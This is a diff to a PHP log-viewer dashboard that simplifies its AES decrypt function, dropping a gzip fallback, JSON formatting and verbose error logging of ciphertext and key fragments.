@@ -1,6 +1,6 @@
 <?php
 // log-viewer.php - Web dashboard for viewing client command logs and user data
-require_once __DIR__ . '/Config.php';
+require_once __DIR__ . '/../config.php';
 Config::init();
 
 // Session settings
@@ -33,27 +33,23 @@ function decrypt($encryptedData, $key)
 {
     try {
         if (!$encryptedData || !is_string($encryptedData)) {
-            error_log("Decrypt: No data or invalid type: " . var_export($encryptedData, true), 3, Config::$ERROR_LOG);
+            error_log("Decrypt: No data or invalid type", 3, Config::$ERROR_LOG);
             return '[No data]';
         }
 
+        // Try AES decryption first
         if (str_contains($encryptedData, '::')) {
             list($ciphertext, $iv) = explode('::', $encryptedData, 2);
+            
             if (empty($ciphertext) || empty($iv)) {
-                error_log("Decrypt: Invalid ciphertext or IV: ciphertext=" . substr($ciphertext, 0, 50) . ", iv=$iv", 3, Config::$ERROR_LOG);
                 return '[Decryption failed: Invalid format]';
             }
 
             $ivDecoded = base64_decode($iv, true);
-            if ($ivDecoded === false || strlen($ivDecoded) !== 16) {
-                error_log("Decrypt: Invalid IV after base64 decode: " . $iv, 3, Config::$ERROR_LOG);
-                return '[Decryption failed: Invalid IV]';
-            }
-
             $keyDecoded = base64_decode($key);
-            if ($keyDecoded === false) {
-                error_log("Decrypt: Invalid key: " . $key, 3, Config::$ERROR_LOG);
-                return '[Decryption failed: Invalid key]';
+            
+            if ($ivDecoded === false || $keyDecoded === false) {
+                return '[Decryption failed: Invalid key or IV]';
             }
 
             $decrypted = openssl_decrypt(
@@ -65,61 +61,18 @@ function decrypt($encryptedData, $key)
             );
 
             if ($decrypted === false) {
-                error_log("Decrypt: AES decryption failed: ciphertext=" . substr($ciphertext, 0, 50), 3, Config::$ERROR_LOG);
                 return '[Decryption failed: AES error]';
-            }
-
-            error_log("Decrypt: AES decrypted: " . substr($decrypted, 0, 50), 3, Config::$ERROR_LOG);
-
-            $jsonDecoded = json_decode($decrypted, true);
-            if ($jsonDecoded !== null) {
-                if (isset($jsonDecoded['content']) && is_string($jsonDecoded['content'])) {
-                    $content = preg_replace('/^\xEF\xBB\xBF/', '', $jsonDecoded['content']);
-                    $lines = explode("\n", $content);
-                    $formattedContent = implode("\n", array_map('trim', $lines));
-                    error_log("Decrypt: Formatted content: " . substr($formattedContent, 0, 50), 3, Config::$ERROR_LOG);
-                    return $formattedContent;
-                }
-                error_log("Decrypt: JSON detected, formatting with unescaped unicode", 3, Config::$ERROR_LOG);
-                return json_encode($jsonDecoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
             }
 
             return $decrypted;
         }
 
-        error_log("Decrypt: No IV separator, trying base64 + gzip: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);
-
-        $base64Decoded = base64_decode($encryptedData, true);
-        if ($base64Decoded === false) {
-            error_log("Decrypt: Base64 decode failed: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);
-            return $encryptedData;
-        }
-
-        $uncompressed = @gzdecode($base64Decoded);
-        if ($uncompressed === false) {
-            error_log("Decrypt: Gzip decode failed: " . substr($base64Decoded, 0, 50), 3, Config::$ERROR_LOG);
-            return $base64Decoded;
-        }
-
-        error_log("Decrypt: Gzip decoded: " . substr($uncompressed, 0, 50), 3, Config::$ERROR_LOG);
-
-        $jsonDecoded = json_decode($uncompressed, true);
-        if ($jsonDecoded !== null) {
-            if (isset($jsonDecoded['content']) && is_string($jsonDecoded['content'])) {
-                $content = preg_replace('/^\xEF\xBB\xBF/', '', $jsonDecoded['content']);
-                $lines = explode("\n", $content);
-                $formattedContent = implode("\n", array_map('trim', $lines));
-                error_log("Decrypt: Formatted content: " . substr($formattedContent, 0, 50), 3, Config::$ERROR_LOG);
-                return $formattedContent;
-            }
-            error_log("Decrypt: JSON detected, formatting with unescaped unicode", 3, Config::$ERROR_LOG);
-            return json_encode($jsonDecoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
-        }
-
-        return $uncompressed;
+        // If no IV separator, return as-is (might be already decrypted or different format)
+        return $encryptedData;
+        
     } catch (Exception $e) {
-        error_log("Decrypt error: " . $e->getMessage() . ", raw data: " . substr($encryptedData, 0, 50), 3, Config::$ERROR_LOG);
-        return '[Decryption error: ' . htmlspecialchars($e->getMessage()) . ']';
+        error_log("Decrypt error: " . $e->getMessage(), 3, Config::$ERROR_LOG);
+        return '[Decryption error]';
     }
 }
 
